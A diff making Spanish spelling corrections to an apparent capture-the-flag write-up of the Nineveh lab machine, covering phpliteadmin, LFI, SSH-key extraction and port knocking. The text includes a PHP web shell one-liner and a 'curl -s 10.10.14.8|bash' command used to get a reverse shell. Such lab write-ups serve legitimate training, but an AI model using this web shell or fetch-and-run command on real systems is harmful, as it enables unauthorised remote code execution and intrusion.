@@ -1,6 +1,6 @@
-## Vuln exploit & Gaining Access {-}
+## Explotacion de vulnerabilidad & Ganando Acceso {-}
 
-### Conneccion desde phpliteadmin {-}
+### Conexion desde phpliteadmin {-}
 
 1. Creamos una base de datos llamada hack.php
 
@@ -16,13 +16,13 @@
     knitr::include_graphics("images/phpliteadmin-create-table.png")
     ```
 
-1. Entramos un commando PHP en la tabla
+1. Entramos un comando PHP en la tabla
 
     ```{r, echo = FALSE, fig.cap="insert php command", out.width="90%"}
     knitr::include_graphics("images/phpliteadmin-insert-command.png")
     ```
 
-    El commando es `<?php system($_REQUEST["cmd"]); ?>`
+    El comando es `<?php system($_REQUEST["cmd"]); ?>`
 
 1. y con el uso de la LFI miramos lo que passa
 
@@ -30,7 +30,7 @@
     knitr::include_graphics("images/phpliteadmin-rce.png")
     ```
 
-Ahora que tenemos possibilidades de ejecutar commandos de manera remota, vamos a tratar de ganar accesso al systema.
+Ahora que tenemos posibilidades de ejecutar comandos de manera remota, vamos a tratar de ganar accesso al sistema.
 
 1. Nos ponemos en escucha por el puerto 443
 
@@ -58,7 +58,7 @@ Ahora que tenemos possibilidades de ejecutar commandos de manera remota, vamos a
     10.10.10.43/department/manage.php?notes=files/ninevehNotes/../var/tmp/hack.php&cmd=curl -s 10.10.14.8|bash
     ```
     
-ya hemos ganado accesso al systema.
+ya hemos ganado accesso al sistema.
 
 ### Tratamiento de la TTY {-}
 
@@ -76,7 +76,7 @@ stty -a
 stty rows <rownb> columns <colnb>
 ```
 
-### Analyzamos el systema {-}
+### Analizamos el sistema {-}
 
 ```bash
 pwd
@@ -100,10 +100,10 @@ exiftool nineveh.png
 strings nineveh.png
 ```
 
-El commando strings nos muestra una key id_rsa privada y una publica del usuario amrois. Como no tenemos accesso al ssh desde fuera copiamos esta clave 
+El comando strings nos muestra una key id_rsa privada y una publica del usuario amrois. Como no tenemos accesso al ssh desde fuera copiamos esta clave 
 en la maquina victima y le hacemos el tratamiento de siempre
 
-### Conneccion por SSH {-}
+### Conexion por SSH {-}
 
 En la maquina victima:
 
@@ -114,11 +114,11 @@ chmod 600 id_rsa
 ssh -i id_rsa amrois@localhost
 ```
 
-Ya estamos connectados como amrois y podemos leer la flag.
+Ya estamos conectados como amrois y podemos leer la flag.
 
-### Otra manera de connectarnos a la maquina {-}
+### Otra manera de conectarnos a la maquina {-}
 
-Si durante el analysis del systema ubieramos ido hasta mirar los processos que estan habiertos en background, ubieramos encontrado que la utilidad
+Si durante el analisis del sistema hubieramos ido hasta mirar los processos que estan habiertos en background, ubieramos encontrado que la utilidad
 `knockd` estava lanzada.
 
 **Knockd** es una utilidad para escuchar o lanzar Port Knocking.
@@ -130,7 +130,7 @@ cat /etc/knockd.conf
 
 Aqui podemos ver que si Knockamos los puertos 571,290,911 se abriria el puerto 22 al exterior y si Knockeamos los puertos 911,290,571 se ceraria.
 
-lo comprobamos desde la maquina de attackante:
+lo comprobamos desde la maquina de atacante:
 
 ```bash
 nmap -p22 10.10.10.43 --open -T5 -v -n
